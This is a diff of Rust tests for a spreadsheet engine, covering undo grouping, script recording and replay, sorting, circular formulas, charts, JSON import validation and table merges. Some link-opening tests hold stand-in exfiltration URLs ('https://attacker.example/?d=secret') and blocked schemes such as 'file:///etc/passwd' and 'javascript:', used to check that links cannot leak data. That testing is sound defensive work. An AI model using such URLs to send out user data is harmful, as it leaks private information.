@@ -330,6 +330,204 @@ fn undo_redo() {
     assert!(s.doc().unwrap().is_dirty());
 }
 
+fn sales() -> Session {
+    let mut s = Session::new();
+    s.execute("file.new", json!({"sample": "sales"})).unwrap();
+    s
+}
+
+fn undo_depth(s: &Session) -> usize {
+    s.doc().unwrap().undo.len()
+}
+
+fn workbook(s: &Session) -> gridcraft_model::Workbook {
+    (*s.doc().unwrap().wb).clone()
+}
+
+#[test]
+fn subtotal_is_one_undo_step() {
+    // Each row insert, label, formula, bold and group Subtotal ran was its own undo step (9, then
+    // 19), and the second Ctrl+Z jumped to a half-built Subtotal.
+    let mut s = sales();
+    s.execute("cell.set", json!({"cell": "A1", "input": "x"})).unwrap();
+    assert_eq!(undo_depth(&s), 1);
+    let start = workbook(&s);
+    s.execute("data.subtotal", json!({"columns": ["J"], "function": "average", "groupBy": "A", "header": "x"})).unwrap();
+    assert_eq!(undo_depth(&s), 2);
+    let once = workbook(&s);
+    assert_ne!(once, start);
+    s.execute("data.subtotal", json!({})).unwrap();
+    assert_eq!(undo_depth(&s), 3);
+    assert_eq!(s.doc().unwrap().undo.last().unwrap().label, "Subtotal");
+    let twice = workbook(&s);
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(workbook(&s), once);
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(workbook(&s), start);
+    s.execute("edit.redo", json!({"steps": 2})).unwrap();
+    assert_eq!(workbook(&s), twice);
+}
+
+#[test]
+fn subtotal_near_the_history_limit_keeps_the_oldest_steps() {
+    // The nested steps used to trim the 100-step history before they were taken back, so undoing
+    // everything no longer reached the starting workbook.
+    let mut s = sales();
+    let start = workbook(&s);
+    for i in 0..99 {
+        s.execute("cell.set", json!({"cell": "N1", "input": i.to_string()})).unwrap();
+    }
+    s.execute("data.subtotal", json!({"columns": ["J"], "groupBy": "A"})).unwrap();
+    assert_eq!(undo_depth(&s), 100);
+    s.execute("edit.undo", json!({"steps": 100})).unwrap();
+    assert_eq!(workbook(&s), start);
+}
+
+#[test]
+fn commands_that_run_other_commands_are_one_undo_step() {
+    let mut s = Session::new();
+    s.new_workbook();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["H"], ["a"], ["a"], ["b"]]})).unwrap();
+    s.execute("insert.table", json!({"range": "A1:A4", "header": true})).unwrap();
+    let depth = undo_depth(&s);
+    let start = workbook(&s);
+    s.execute("table.removeDuplicates", json!({})).unwrap();
+    assert_ne!(workbook(&s), start);
+    assert_eq!(undo_depth(&s), depth + 1);
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(workbook(&s), start);
+}
+
+#[test]
+fn a_script_is_one_undo_step_and_its_own_undo_takes_back_its_own_step() {
+    let mut s = Session::new();
+    s.new_workbook();
+    s.execute("cell.set", json!({"cell": "C1", "input": "before"})).unwrap();
+    let cmds = json!([
+        {"command": "cell.set", "params": {"cell": "A1", "input": "1"}},
+        {"command": "edit.undo", "params": {}},
+        {"command": "cell.set", "params": {"cell": "B1", "input": "2"}},
+    ]);
+    s.execute("automate.newScript", json!({"name": "S", "commands": cmds})).unwrap();
+    let depth = undo_depth(&s);
+    let start = workbook(&s);
+    s.execute("automate.runScript", json!({"name": "S"})).unwrap();
+    // The script's Undo took back its own A1, not C1 from before the script.
+    assert_eq!(v(&s, "A1"), Value::Empty);
+    assert_eq!(v(&s, "B1"), Value::Number(2.0));
+    assert_eq!(v(&s, "C1"), Value::Text("before".into()));
+    assert_eq!(undo_depth(&s), depth + 1);
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(workbook(&s), start);
+}
+
+/// Records `act` as a script, then checks the recording and the journal hold `expect` (each step
+/// once, none of the commands a step ran for itself) and that both replay `act` on a fresh copy.
+/// `act` must add `undo_steps` undo steps.
+fn record_and_replay(fresh: fn() -> Session, act: impl Fn(&mut Session), expect: &[&str], undo_steps: usize) {
+    let mut s = fresh();
+    let journal_at = s.journal.len();
+    s.execute("automate.recordActions", json!({})).unwrap();
+    let depth = undo_depth(&s);
+    act(&mut s);
+    // fix/subtotal-single-undo: each recorded action is still one undo step.
+    assert_eq!(undo_depth(&s), depth + undo_steps);
+    let r = s.execute("automate.recordActions", json!({"stop": true, "name": "Rec"})).unwrap();
+    let ids: Vec<&str> = s.journal[journal_at..].iter().map(|(id, _)| id.as_str()).filter(|id| !id.starts_with("automate.")).collect();
+    assert_eq!(ids, expect, "journal");
+    assert_eq!(r["steps"], expect.len());
+    let sheets = s.doc().unwrap().wb.sheets.clone();
+
+    // Replaying the journal on a fresh copy gives the same sheets...
+    let mut j = fresh();
+    for (id, p) in s.journal[journal_at..].iter().filter(|(id, _)| !id.starts_with("automate.")) {
+        j.execute(id, p.clone()).unwrap_or_else(|e| panic!("{id}: {e}"));
+    }
+    assert!(j.doc().unwrap().wb.sheets == sheets, "journal replay differs");
+    // ...and so does running the recorded script there.
+    let steps: Vec<serde_json::Value> =
+        s.journal[journal_at..].iter().filter(|(id, _)| !id.starts_with("automate.")).map(|(id, p)| json!({"command": id, "params": p})).collect();
+    let mut r = fresh();
+    r.execute("automate.newScript", json!({"name": "Rec", "commands": steps})).unwrap();
+    r.execute("automate.runScript", json!({"name": "Rec"})).unwrap();
+    assert!(r.doc().unwrap().wb.sheets == sheets, "script replay differs");
+}
+
+#[test]
+fn a_recorded_subtotal_replays_once() {
+    // The rows, labels, formulas, bold and groups Subtotal ran were journaled ahead of it, so a
+    // recording replayed them and then ran Subtotal again on top.
+    record_and_replay(
+        sales,
+        |s| {
+            s.execute("data.subtotal", json!({"columns": ["J"], "groupBy": "A"})).unwrap();
+        },
+        &["data.subtotal"],
+        1,
+    );
+}
+
+#[test]
+fn a_recorded_run_script_replays_its_steps_once() {
+    // Run Script isn't journaled itself; the steps it runs are, once each, so the recording
+    // replays on a copy that doesn't have the script.
+    fn with_script() -> Session {
+        let mut s = sales();
+        let cmds = json!([
+            {"command": "cell.set", "params": {"cell": "N1", "input": "total"}},
+            {"command": "data.subtotal", "params": {"columns": ["J"], "groupBy": "A"}},
+        ]);
+        s.execute("automate.newScript", json!({"name": "Sub", "commands": cmds})).unwrap();
+        s
+    }
+    record_and_replay(
+        with_script,
+        |s| {
+            s.execute("automate.runScript", json!({"name": "Sub"})).unwrap();
+            s.execute("cell.set", json!({"cell": "N2", "input": "after"})).unwrap();
+        },
+        &["cell.set", "data.subtotal", "cell.set"],
+        2,
+    );
+    let mut s = with_script();
+    let depth = undo_depth(&s);
+    s.execute("automate.runScript", json!({"name": "Sub"})).unwrap();
+    assert_eq!(undo_depth(&s), depth + 1, "a script is one undo step");
+    assert!(!s.journal.iter().any(|(id, _)| id == "automate.runScript"));
+}
+
+#[test]
+fn a_command_that_runs_commands_like_a_plugin_is_journaled_once() {
+    // From Text/CSV runs Insert Sheet, Set Values, Insert Table and AutoFit, as a plugin command
+    // runs the engine commands it answers with.
+    fn book() -> Session {
+        let mut s = Session::new();
+        s.new_workbook();
+        s
+    }
+    record_and_replay(
+        book,
+        |s| {
+            s.execute("data.fromTextCsv", json!({"text": "Name,Qty\na,1\na,1\nb,2", "sheet": "Imported"})).unwrap();
+            s.execute("table.removeDuplicates", json!({})).unwrap();
+        },
+        &["data.fromTextCsv", "table.removeDuplicates"],
+        2,
+    );
+}
+
+#[test]
+fn a_failed_nested_step_leaves_the_journal_working() {
+    // A script whose step fails must not leave the journal switched off.
+    let mut s = sales();
+    let _ = s.execute("automate.runScript", json!({"name": "missing"}));
+    s.execute("automate.newScript", json!({"name": "Bad", "commands": [{"command": "cell.set", "params": {}}]})).unwrap();
+    assert!(s.execute("automate.runScript", json!({"name": "Bad"})).is_err());
+    let at = s.journal.len();
+    s.execute("cell.set", json!({"cell": "N1", "input": "1"})).unwrap();
+    assert_eq!(s.journal.len(), at + 1);
+}
+
 #[test]
 fn redo_selects_the_redone_cell() {
     // #1855: type into A1..A3, click A1, undo, redo: the selection follows the edit to A3.
@@ -675,11 +873,13 @@ fn rich_clipboard_omits_html_for_large_ranges_without_truncating_text() {
 #[test]
 fn rich_clipboard_omits_html_when_escaping_exceeds_byte_budget() {
     let mut s = s();
-    let text = "&".repeat(1_000_000);
-    s.execute("range.setValues", json!({"range": "A1", "values": [[text]]})).unwrap();
-    let copied = s.execute("edit.copy", json!({"range": "A1", "html": true})).unwrap();
+    // Cells hold at most 32,767 characters, so 30 full cells of `&` (5 bytes each once escaped)
+    // pass the 4 MiB HTML budget while the plain text stays far below it.
+    let cell = "&".repeat(32_767);
+    s.execute("range.setValues", json!({"range": "A1", "values": [vec![cell; 30]]})).unwrap();
+    let copied = s.execute("edit.copy", json!({"range": "A1:AD1", "html": true})).unwrap();
     assert!(copied.get("html").is_none(), "an oversized escaped value must not produce partial HTML");
-    assert_eq!(copied["text"].as_str().unwrap().len(), 1_000_001);
+    assert_eq!(copied["text"].as_str().unwrap().len(), 30 * 32_767 + 30);
     assert!(copied["text"].as_str().unwrap().ends_with("&\n"));
 }
 
@@ -1448,6 +1648,27 @@ fn case_sensitive_sort_puts_lowercase_first() {
     assert_eq!(col, ["a", "A", "aB", "Ab", "b", "B"].map(Value::from));
 }
 
+/// Data > Sort orders numbers exactly, like Excel 365: 0.3 sorts before `=0.1+0.2`
+/// (0.30000000000000004) ascending and after it descending, whatever the input order.
+#[test]
+fn sort_orders_numbers_exactly() {
+    for first_noisy in [true, false] {
+        let mut s = s();
+        let (a1, a2, b1, b2) = if first_noisy { ("=0.1+0.2", "0.3", "e", "t") } else { ("0.3", "=0.1+0.2", "t", "e") };
+        for (cell, input) in [("A1", a1), ("A2", a2), ("B1", b1), ("B2", b2)] {
+            s.execute("cell.set", json!({"cell": cell, "input": input})).unwrap();
+        }
+        let labels = |s: &Session| [v(s, "B1"), v(s, "B2")];
+        s.execute("data.sort", json!({"range": "A1:B2", "header": false, "keys": [{"column": "A"}]})).unwrap();
+        assert_eq!(labels(&s), ["t", "e"].map(Value::from), "ascending, noisy first: {first_noisy}");
+        s.execute("data.sort", json!({"range": "A1:B2", "header": false, "keys": [{"column": "A", "order": "desc"}]})).unwrap();
+        assert_eq!(labels(&s), ["e", "t"].map(Value::from), "descending, noisy first: {first_noisy}");
+        s.execute("selection.set", json!({"range": "A1:B2"})).unwrap();
+        s.execute("data.sortAscending", json!({"range": "A1:B2", "column": "A"})).unwrap();
+        assert_eq!(labels(&s), ["t", "e"].map(Value::from), "quick sort, noisy first: {first_noisy}");
+    }
+}
+
 #[test]
 fn sort_with_a_sheet_prefix_sorts_the_named_sheet() {
     let col = |s: &Session, sheet: &str| -> Vec<Value> {
@@ -1902,7 +2123,7 @@ fn slicer_filters_table() {
         let d = s.doc().unwrap();
         let sh = d.wb.active().unwrap();
         assert_eq!(sh.slicers.len(), 1);
-        assert_eq!(sh.slicers[0].column, "Region");
+        assert_eq!(sh.slicers[0].field(), "Region");
     }
 
     // Single-click "East": only the two East rows remain (West row 2 and North row 4 hidden).
@@ -1922,7 +2143,7 @@ fn slicer_filters_table() {
     // Clear restores everything.
     s.execute("slicer.clear", json!({"slicer": id})).unwrap();
     assert_eq!(hidden(&s), 0);
-    assert!(s.doc().unwrap().wb.active().unwrap().slicers[0].selected.is_none());
+    assert!(matches!(&s.doc().unwrap().wb.active().unwrap().slicers[0].source, gridcraft_model::SlicerSource::Table { selected: None, .. }));
 
     // Deleting the slicer drops it and clears its filter.
     s.execute("slicer.toggle", json!({"slicer": id, "value": "East"})).unwrap();
@@ -2998,6 +3219,45 @@ fn show_outline_symbols_toggles() {
     assert!(!on(&s));
 }
 
+/// A circular formula saved by Excel opens with its cached value, as do the formulas reading it,
+/// and saving keeps them (the loop used to open as #CIRC!, saved as 0).
+#[test]
+fn circular_formula_from_a_file_keeps_its_values() {
+    use gridcraft_model::{Cell, Formula, Workbook};
+    let mut wb = Workbook::new();
+    {
+        let sh = wb.sheet_mut(0).unwrap();
+        sh.cells.set(CellRef::parse("A1").unwrap(), Cell::value(Value::from("x")));
+        let mut b1 = Cell::formula(Formula::new("=IF($A1=B$1,1,0)"));
+        b1.value = Value::Number(1.0);
+        sh.cells.set(CellRef::parse("B1").unwrap(), b1);
+        let mut b2 = Cell::formula(Formula::new("=IF($A1=B$1,1,0)+B$1"));
+        b2.value = Value::Number(1.0);
+        sh.cells.set(CellRef::parse("B2").unwrap(), b2);
+    }
+    let bytes = gridcraft_xlsx::write_xlsx(&wb).unwrap();
+    let mut s = Session::new();
+    s.execute("file.open", json!({"name": "loop.xlsx", "base64": crate::io::base64_encode(&bytes)})).unwrap();
+    assert_eq!(v(&s, "B1"), Value::Number(1.0));
+    assert_eq!(v(&s, "B2"), Value::Number(1.0));
+    assert!(!s.doc().unwrap().calc.circular.is_empty());
+    reopen(&mut s);
+    assert_eq!(v(&s, "B1"), Value::Number(1.0));
+    assert_eq!(v(&s, "B2"), Value::Number(1.0));
+}
+
+/// A circular dynamic-array formula opens, saves and reopens without spilling.
+#[test]
+fn circular_array_formula_keeps_its_value_through_save() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "B1", "input": "=SEQUENCE(3)+B1*0"})).unwrap();
+    assert_eq!(v(&s, "B1"), Value::Number(0.0));
+    assert!(v(&s, "B2").is_empty());
+    reopen(&mut s);
+    assert_eq!(v(&s, "B1"), Value::Number(0.0));
+    assert!(v(&s, "B2").is_empty() && v(&s, "B3").is_empty());
+}
+
 fn reopen(s: &mut Session) {
     let r = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
     let b64 = r["base64"].as_str().unwrap().to_string();
@@ -3013,7 +3273,8 @@ fn calculation_options_enable_iterative_calculation() {
     };
     s.execute("cell.set", json!({"cell": "A1", "input": "=(A2+10)/2"})).unwrap();
     s.execute("cell.set", json!({"cell": "A2", "input": "=A1"})).unwrap();
-    assert_eq!(v(&s, "A1"), Value::Error(gridcraft_core::CellError::Circ));
+    // Off, the loop keeps the values it shows (as in Excel) and is reported.
+    assert_eq!((v(&s, "A1"), v(&s, "A2")), (Value::Number(5.0), Value::Number(5.0)));
     assert!(!s.doc().unwrap().calc.circular.is_empty());
     // Switching it on recalculates the loop.
     let r = s.execute("formulas.calculationOptions", json!({"iterative": true})).unwrap();
@@ -3036,7 +3297,8 @@ fn calculation_options_enable_iterative_calculation() {
     near(&s, "A1", 10.0);
     // Undo brings the previous settings back.
     s.execute("formulas.calculationOptions", json!({"iterative": false})).unwrap();
-    assert_eq!(v(&s, "A1"), Value::Error(gridcraft_core::CellError::Circ));
+    near(&s, "A1", 10.0);
+    assert!(!s.doc().unwrap().calc.circular.is_empty());
     s.execute("edit.undo", json!({})).unwrap();
     assert!(s.doc().unwrap().wb.calc.iterative);
     near(&s, "A1", 10.0);
@@ -3093,6 +3355,7 @@ fn every_chart_kind_survives_xlsx() {
         ("combo", ChartKind::Combo),
         ("stock", ChartKind::Stock),
         ("histogram", ChartKind::Histogram),
+        ("pareto", ChartKind::Pareto),
         ("boxWhisker", ChartKind::BoxWhisker),
         ("waterfall", ChartKind::Waterfall),
         ("funnel", ChartKind::Funnel),
@@ -3122,6 +3385,16 @@ fn every_chart_kind_survives_xlsx() {
             }
         }
     }
+}
+
+#[test]
+fn pareto_chart_has_no_legend() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["Item", "Count"], ["A", 3], ["B", 2], ["C", 1]]})).unwrap();
+    s.execute("insert.chart", json!({"type": "pareto", "range": "A1:B4"})).unwrap();
+    let c = &s.doc().unwrap().wb.active().unwrap().charts[0];
+    assert_eq!(c.kind, gridcraft_model::ChartKind::Pareto);
+    assert_eq!(c.legend, gridcraft_model::LegendPos::None);
 }
 
 #[test]
@@ -3949,6 +4222,32 @@ fn json_import_rebuilds_cell_store_bands_and_counts() {
 }
 
 #[test]
+fn json_import_orders_ranges_and_checks_arrays() {
+    // #2160: ranges and arrays were taken from a JSON workbook as written. A merge with its
+    // corners swapped (or off the sheet) wrapped `height()` to about 4.29e9 in release, and an
+    // array shorter than rows x cols was indexed past its end.
+    let mut s = s();
+    s.execute("home.mergeCells", json!({"range": "B2:C3"})).unwrap();
+    s.execute("cell.set", json!({"cell": "A5", "input": "keep"})).unwrap();
+    let wb = &s.doc().unwrap().wb;
+    let good: serde_json::Value = serde_json::to_value(&**wb).unwrap();
+
+    let mut v = good.clone();
+    v["sheets"][0]["merges"][0] = json!({"start": {"row": 4_000_000_000u32, "col": 5}, "end": {"row": 2, "col": 1}});
+    let (back, _) = crate::io::open_bytes("book.json", &serde_json::to_vec(&v).unwrap()).unwrap();
+    let merge = back.active().unwrap().merges[0];
+    assert_eq!(merge, gridcraft_core::RangeRef::parse("B3:F1048576").unwrap());
+    assert_eq!(merge.height(), 1_048_574);
+
+    let mut v = good;
+    let cells = v["sheets"][0]["cells"]["bands"].as_object_mut().unwrap();
+    let band = cells.values_mut().next().unwrap();
+    band["rows"]["4"]["0"]["value"] = json!({"t": "Array", "v": {"rows": 1000, "cols": 1000, "data": []}});
+    let e = crate::io::open_bytes("book.json", &serde_json::to_vec(&v).unwrap()).unwrap_err().to_string();
+    assert!(e.contains("not a GridCraft JSON workbook") && e.contains("1000 × 1000"), "{e}");
+}
+
+#[test]
 fn notes_comments_and_links_survive_a_json_save() {
     let mut s = s();
     s.execute("cell.set", json!({"cell": "A1", "input": "x"})).unwrap();
@@ -4140,6 +4439,31 @@ fn links_to_files_are_saved_as_external_relationships() {
         let h = &back.sheet(0).unwrap().hyperlinks[&CellRef::parse(cell).unwrap()];
         assert_eq!((h.target.as_str(), h.external), (target.trim_start_matches('#'), external), "{cell}");
     }
+}
+
+#[test]
+fn evaluate_formula_steps_snap_only_the_root() {
+    // Excel snaps a near-cancelling subtraction only at the root of a formula, so an inner step shows
+    // the IEEE residue while the final result of =(A1-B1) is the same residue, and =A1-B1 shows 0 for both.
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[1.0, 1.0 + f64::EPSILON]]})).unwrap();
+    let steps = |s: &mut Session, f: &str| s.execute("formulas.evaluateFormula", json!({"formula": f})).unwrap();
+    let find = |r: &serde_json::Value, expr: &str| {
+        r["steps"].as_array().unwrap().iter().find(|x| x["expression"] == expr).map(|x| x["value"].as_f64().unwrap())
+    };
+
+    let r = steps(&mut s, "=(A1-B1)");
+    assert_eq!(find(&r, "A1-B1"), Some(-f64::EPSILON));
+    assert_eq!(r["result"].as_f64(), Some(-f64::EPSILON));
+
+    let r = steps(&mut s, "=A1-B1");
+    assert_eq!(find(&r, "A1-B1"), Some(0.0), "the root step is the result");
+    assert_eq!(r["result"].as_f64(), Some(0.0));
+
+    // An inner step of a larger formula does not snap, even when it is itself a subtraction.
+    let r = steps(&mut s, "=A1-B1+0");
+    assert_eq!(find(&r, "A1-B1"), Some(-f64::EPSILON));
+    assert_eq!(r["result"].as_f64(), Some(-f64::EPSILON));
 }
 
 #[test]
@@ -4549,10 +4873,55 @@ fn link_open_refuses_every_scheme_but_http_https_and_mailto() {
     }
     assert!(s.execute("link.open", json!({"cell": "A1"})).is_err());
     assert!(s.take_ui_requests().is_empty());
+    // A host's `Allow` policy opens web and e-mail addresses directly, and nothing else.
+    s.link_policy = crate::links::LinkPolicy::Allow;
+    for url in ["file:///etc/passwd", "smb://h/s", "\\\\h\\s", "JAVASCRIPT:1"] {
+        assert!(s.execute("link.open", json!({"url": url})).is_err(), "{url}");
+    }
+    assert!(s.take_ui_requests().is_empty());
     s.execute("link.open", json!({"url": "HTTPS://example.org/a"})).unwrap();
     assert_eq!(s.take_ui_requests(), vec![crate::UiRequest::OpenUrl("HTTPS://example.org/a".into())]);
     s.execute("link.open", json!({"url": "B2"})).unwrap();
     assert!(s.take_ui_requests().is_empty());
+}
+
+/// #2181: `link.open` is reachable by the control channel, CLI, MCP and scripts, so by default it
+/// opens no web or e-mail address (an exfiltration channel: `https://attacker/?d=<cell data>`)
+/// and asks for no dialog either; only the host's confirmed path opens one.
+#[test]
+fn programmatic_link_open_never_opens_an_external_address_without_confirmation() {
+    let mut s = s();
+    assert_eq!(s.link_policy, crate::links::LinkPolicy::Confirm, "confirmation is the default");
+    s.execute("cell.set", json!({"cell": "A1", "input": "secret"})).unwrap();
+    s.execute("insert.link", json!({"cell": "B1", "target": "https://attacker.example/?d=secret"})).unwrap();
+    s.execute("insert.link", json!({"cell": "C1", "target": "mailto:x@attacker.example"})).unwrap();
+    s.take_ui_requests();
+    for p in [
+        json!({"url": "https://attacker.example/?d=secret"}),
+        json!({"url": "http://attacker.example"}),
+        json!({"target": "MAILTO:x@attacker.example"}),
+        json!({"cell": "B1"}),
+        json!({"cell": "C1"}),
+    ] {
+        let e = s.execute("link.open", p.clone()).unwrap_err().to_string();
+        assert!(e.contains(crate::links::NEEDS_CONFIRMATION), "{p}: {e}");
+    }
+    assert!(s.take_ui_requests().is_empty(), "no OpenUrl and no dialog for a programmatic caller");
+    assert!(s.execute_headless("link.open", json!({"cell": "B1"})).is_err());
+    assert!(s.take_ui_requests().is_empty());
+    // References still navigate.
+    s.execute("link.open", json!({"url": "A1"})).unwrap();
+    assert!(s.take_ui_requests().is_empty());
+
+    // The host's confirmed path opens the allowed address, and still refuses every other scheme.
+    assert_eq!(s.open_confirmed_link(" https://example.org/a ").unwrap(), json!({"opened": "https://example.org/a"}));
+    assert_eq!(s.take_ui_requests(), vec![crate::UiRequest::OpenUrl("https://example.org/a".into())]);
+    for url in ["file:///etc/passwd", "\\\\h\\s", "javascript:1", "x-custom://a", "\u{1}https://a.example"] {
+        assert!(s.open_confirmed_link(url).is_err(), "{url:?}");
+    }
+    assert!(s.take_ui_requests().is_empty());
+    s.open_confirmed_link("Sheet1!C3").unwrap();
+    assert_eq!(s.doc().unwrap().selection.active, CellRef::new(2, 2));
 }
 
 #[test]
@@ -5233,4 +5602,129 @@ fn a_saved_workbook_keeps_its_values_until_an_edit_reaches_them() {
 fn unique_nonce() -> u64 {
     static N: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
     N.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
+}
+
+#[test]
+fn tables_never_hold_merged_cells() {
+    // A merged cell inside a table makes Excel remove the table (and its filter) when it opens
+    // the file. Excel refuses to merge in a table and unmerges what a new table covers.
+    let base = || {
+        let mut s = s();
+        s.execute("range.setValues", json!({"range": "A1", "values": [["H1", "H2", "H3"], [1, 2, 3], [4, 5, 6], [7, 8, 9]]})).unwrap();
+        s
+    };
+    let merges = |s: &Session| s.doc().unwrap().wb.active().unwrap().merges.clone();
+    let mut s = base();
+    s.execute("insert.table", json!({"range": "A1:C4"})).unwrap();
+    for id in ["home.mergeCells", "home.mergeCenter", "home.mergeAcross"] {
+        for range in ["A2:B2", "A1:B1", "C3:D3"] {
+            let e = s.execute(id, json!({"range": range})).unwrap_err().to_string();
+            assert!(e.contains("can't merge cells in a table"), "{id} {range}: {e}");
+        }
+    }
+    assert!(merges(&s).is_empty());
+    s.execute("home.mergeCells", json!({"range": "E2:F2"})).unwrap();
+    assert_eq!(merges(&s), vec![gridcraft_core::RangeRef::parse("E2:F2").unwrap()]);
+
+    // A table over merged cells unmerges them; undo brings them back.
+    let mut s = base();
+    s.execute("home.mergeCells", json!({"range": "A2:B2"})).unwrap();
+    s.execute("home.mergeCells", json!({"range": "C3:D4"})).unwrap();
+    s.execute("home.mergeCells", json!({"range": "F1:G1"})).unwrap();
+    s.execute("insert.table", json!({"range": "A1:C4"})).unwrap();
+    assert_eq!(merges(&s), vec![gridcraft_core::RangeRef::parse("F1:G1").unwrap()]);
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(merges(&s).len(), 3);
+    s.execute("edit.redo", json!({})).unwrap();
+
+    // Resizing a table over merged cells unmerges them too.
+    let mut s = base();
+    s.execute("insert.table", json!({"range": "A1:B4", "name": "T"})).unwrap();
+    s.execute("home.mergeCells", json!({"range": "C2:D2"})).unwrap();
+    s.execute("table.resize", json!({"table": "T", "range": "A1:C4"})).unwrap();
+    assert!(merges(&s).is_empty());
+
+    // Merged cells pasted into a table arrive unmerged; elsewhere they stay merged.
+    s.execute("home.mergeCells", json!({"range": "E2:F3"})).unwrap();
+    s.execute("edit.copy", json!({"range": "E2:F3"})).unwrap();
+    s.execute("edit.paste", json!({"at": "A2"})).unwrap();
+    s.execute("edit.paste", json!({"at": "H2"})).unwrap();
+    assert_eq!(merges(&s), vec![gridcraft_core::RangeRef::parse("E2:F3").unwrap(), gridcraft_core::RangeRef::parse("H2:I3").unwrap()]);
+
+    // The saved file has no merge inside the table.
+    let saved = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
+    let bytes = crate::io::base64_decode(saved["base64"].as_str().unwrap()).unwrap();
+    let (back, _) = crate::io::open_bytes("t.xlsx", &bytes).unwrap();
+    let sh = back.active().unwrap();
+    assert!(sh.merges.iter().all(|m| sh.tables.iter().all(|t| !t.range.intersects(m))));
+}
+
+
+/// Normal, Page Layout and Page Break Preview are not undo steps (as in Excel), so undoing or
+/// redoing an edit keeps each sheet in the view it is in now, instead of putting back the view
+/// of the snapshot it swaps in. Found through the command-sequence fuzz (seed 177).
+#[test]
+fn undo_and_redo_keep_each_sheets_view() {
+    use gridcraft_model::SheetViewMode;
+    let view = |s: &Session, i: usize| s.doc().unwrap().wb.sheet(i).unwrap().view;
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
+    s.execute("view.pageBreakPreview", json!({})).unwrap();
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(v(&s, "A1"), Value::Empty);
+    assert_eq!(view(&s, 0), SheetViewMode::PageBreakPreview, "undo leaves the view alone");
+    s.execute("view.pageLayout", json!({})).unwrap();
+    s.execute("edit.redo", json!({})).unwrap();
+    assert_eq!(v(&s, "A1"), Value::Number(1.0));
+    assert_eq!(view(&s, 0), SheetViewMode::PageLayout, "redo leaves the view alone");
+
+    // Undoing a rename: the sheet is found at its position under the restored name.
+    s.execute("sheet.rename", json!({"sheet": 0, "name": "Renamed"})).unwrap();
+    s.execute("view.normal", json!({})).unwrap();
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_ne!(s.doc().unwrap().wb.sheet(0).unwrap().name, "Renamed");
+    assert_eq!(view(&s, 0), SheetViewMode::Normal);
+
+    // Undoing a new sheet: the other sheets keep theirs.
+    s.execute("view.pageBreakPreview", json!({})).unwrap();
+    s.execute("home.insertSheet", json!({"name": "Extra"})).unwrap();
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(s.doc().unwrap().wb.sheets.len(), 1);
+    assert_eq!(view(&s, 0), SheetViewMode::PageBreakPreview);
+}
+
+#[test]
+fn a_multi_step_undo_keeps_views_through_each_step() {
+    // A rename and a new sheet undone in one call: neither the name nor the sheet count matches
+    // between the first and last workbook, so the view is carried step by step.
+    let mut s = s();
+    let first = s.doc().unwrap().wb.sheet(0).unwrap().name.clone();
+    s.execute("sheet.rename", json!({"sheet": 0, "name": "Renamed"})).unwrap();
+    s.execute("view.pageBreakPreview", json!({"sheet": 0})).unwrap();
+    s.execute("home.insertSheet", json!({"name": "Extra"})).unwrap();
+    s.execute("edit.undo", json!({"steps": 2})).unwrap();
+    let d = s.doc().unwrap();
+    assert_eq!(d.wb.sheets.len(), 1);
+    assert_eq!(d.wb.sheet(0).unwrap().name, first);
+    assert_eq!(d.wb.sheet(0).unwrap().view, gridcraft_model::SheetViewMode::PageBreakPreview);
+    s.execute("edit.redo", json!({"steps": 2})).unwrap();
+    let d = s.doc().unwrap();
+    assert_eq!((d.wb.sheets.len(), d.wb.sheet(0).unwrap().name.as_str()), (2, "Renamed"));
+    assert_eq!(d.wb.sheet(0).unwrap().view, gridcraft_model::SheetViewMode::PageBreakPreview);
+}
+
+#[test]
+fn a_view_kept_through_redo_doesnt_make_the_saved_workbook_dirty() {
+    let mut s = s();
+    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
+    {
+        let d = s.doc_mut().unwrap();
+        d.saved = d.wb.clone();
+    }
+    s.execute("edit.undo", json!({})).unwrap();
+    s.execute("view.pageBreakPreview", json!({})).unwrap();
+    s.execute("edit.redo", json!({})).unwrap();
+    let d = s.doc().unwrap();
+    assert_eq!(d.wb.active().unwrap().view, gridcraft_model::SheetViewMode::PageBreakPreview);
+    assert!(!d.is_dirty(), "back at the saved edits, the view alone isn't a change");
 }
